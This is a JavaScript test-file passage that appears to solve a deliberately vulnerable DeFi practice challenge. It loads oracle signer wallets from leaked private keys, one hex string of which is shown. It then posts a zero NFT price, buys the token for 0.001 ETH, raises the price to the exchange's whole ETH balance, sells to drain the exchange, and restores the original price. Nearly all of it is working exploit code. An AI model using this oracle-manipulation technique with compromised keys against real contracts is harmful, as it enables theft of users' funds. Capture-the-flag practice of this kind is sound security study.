...
it("Execution", async function () {
    "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
    const PKs = [
    ...
    //  load sources from private keys
    const sourcesAcc = PKs.map((pk) => {
        return new ethers.Wallet(pk).connect(ethers.provider);
    });

    for (let i = 0; i < sourcesAcc.length; i++) {
        await oracle.connect(sourcesAcc[i]).postPrice("DVNFT", 0);
    
    }
    
    // send with 0.001 eth
    await exchange.connect(player).buyOne({ value: 1000000000000000 });

    for (let i = 0; i < sourcesAcc.length; i++) {
        await oracle.connect(sourcesAcc[i]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    }

    // approve the exchange to transfer the token
    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    for (let i = 0; i < sourcesAcc.length; i++) {
        await oracle.connect(sourcesAcc[i]).postPrice("DVNFT", INITIAL_NFT_PRICE);
    }
});
